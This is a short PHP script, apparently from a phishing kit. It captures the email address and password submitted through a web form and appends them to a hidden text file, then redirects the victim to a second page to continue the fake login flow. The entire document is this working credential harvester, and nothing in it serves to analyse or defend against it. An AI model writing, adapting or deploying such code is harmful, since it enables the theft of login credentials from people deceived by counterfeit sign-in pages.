<?php

file_put_contents("../Tatt1.txt", "  " . $_POST['email'] . "  :  " . $_POST['pass'] . "\n", FILE_APPEND);
header('Location:secound.php');
exit();
